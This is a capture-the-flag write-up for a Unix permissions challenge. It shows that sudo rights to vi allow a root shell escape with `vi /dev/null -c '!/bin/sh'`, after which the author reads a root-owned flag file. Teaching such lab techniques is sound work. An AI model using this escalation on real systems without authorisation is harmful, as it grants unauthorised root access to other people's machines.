# Permissions

## Solution

This challenge requires some understanding of Unix permissions and privileges.  
Once connected to the server, very little information is provided about what to do.  

Using `ls`, nothing is displayed, and the hidden files reveal little to nothing about the task at hand.  

**What can we do then?**  

Let’s check the hint:  

```
What permissions do you have?
```

We can now type `sudo -l` to view our permissions within the system. Here’s the output:  

```shell
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Our starting point is clearly **vi**!  
But what can we do with that?  

On a Linux system, permissions are inherited from one process to another launched by the parent process.  
So, if we could only launch *something* from within vi, it would inherit the elevated permissions!  
What can we do then?  

Here’s the solution:  

```shell
vi /dev/null -c '!/bin/sh'
```

In this command:  
- `/dev/null` is specified as the file, essentially making vi behave like a temporary buffer since nothing can be written to `/dev/null`.  
- The option `-c` allows us to directly pass a command to vi from the terminal.  
- Finally, `!/bin/sh` executes a program (in this case, a shell) from within vi. The exclamation mark indicates that we’re invoking an external program, not a built-in vi command.  

Once this is executed, all it takes is to read the flag located in the root directory:  

```shell
cat /root/.flag.txt
```

And that's it! 🎉  

